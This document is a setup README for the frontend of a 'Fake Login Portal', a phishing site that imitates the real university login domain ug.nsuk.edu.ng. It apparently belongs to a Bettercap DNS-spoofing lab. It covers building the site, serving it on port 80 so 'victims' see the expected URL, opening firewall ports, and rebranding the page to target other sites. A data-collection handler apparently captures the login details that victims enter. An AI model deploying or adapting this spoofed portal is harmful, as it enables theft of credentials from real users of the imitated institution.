# Frontend Setup - Fake Login Portal

## Quick Start

### 1. Install Dependencies

```bash
yarn install
```

### 2. Configure Backend URL

Edit `frontend/.env`:

```bash
VITE_API_URL=http://your_pc_ip:5000
```

**Replace `your_pc_ip` with your machine's actual IP address.**

**Find your machine's IP:**
```bash
# Linux/Mac
ip addr show | grep inet
# or
ifconfig | grep inet

# Windows
ipconfig
```

Example: If your IP is `192.168.1.100`, change the `.env` file to:
```bash
VITE_API_URL=http://192.168.1.100:5000
```

### 3. Build for Production

```bash
yarn build
```

This creates optimized files in the `dist/` folder.

### 4. Serve the Application

**Option 1: Using Python (Recommended for Lab)**
```bash
cd dist
sudo python3 -m http.server 80
```

**Option 2: Using serve package**
```bash
npm install -g serve
sudo serve -s dist -l 80
```

**Option 3: Using nginx (Production)**
```bash
sudo apt install nginx
sudo cp -r dist/* /var/www/html/
sudo systemctl restart nginx
```

## Development Mode

For development with hot reload:
```bash
yarn dev
```

Access at `http://localhost:5173`

**Note:** Development mode won't work for the DNS spoofing lab. Always use production build.

## Port Configuration

### Why Port 80?
- HTTP default port
- Victims expect `http://ug.nsuk.edu.ng` (no port number)
- Requires sudo/administrator privileges

### Using Different Port
If port 80 is unavailable:
```bash
sudo python3 -m http.server 8080
```

Victims must access: `http://ug.nsuk.edu.ng:8080`

## Firewall Configuration

Allow HTTP traffic:
```bash
# Ubuntu/Debian
sudo ufw allow 80/tcp

# CentOS/RHEL
sudo firewall-cmd --add-port=80/tcp --permanent
sudo firewall-cmd --reload
```

## Troubleshooting

### Port 80 already in use
```bash
# Check what's using port 80
sudo lsof -i :80

# Stop Apache if installed
sudo systemctl stop apache2

# Stop nginx if installed
sudo systemctl stop nginx
```

### Permission denied on port 80
```bash
# Must run with sudo
sudo python3 -m http.server 80
```

### Can't connect from other devices
1. Check firewall allows port 80
2. Verify server is listening on `0.0.0.0` not `127.0.0.1`
3. Confirm backend URL is correct in `frontend/.env` (replace `your_pc_ip` with actual IP)

## File Structure

```
frontend/
├── src/
│   ├── components/     # React components
│   ├── utils/          # DataCollectionHandler
│   ├── Login.tsx       # Main login page
│   └── index.css       # Styles
├── dist/               # Production build (after yarn build)
└── package.json        # Dependencies
```

## Customization

### Change Target Domain
The fake site mimics `ug.nsuk.edu.ng`. To target a different site:

1. Update Bettercap DNS spoof domain
2. Modify branding in `src/components/Right.tsx`
3. Update logo URL in Right component
4. Adjust colors in `src/index.css`

### Styling
- Colors: Edit `src/index.css` and component files
- Logo: Update image URL in `Right.tsx`
- Layout: Modify `Login.tsx` and component files
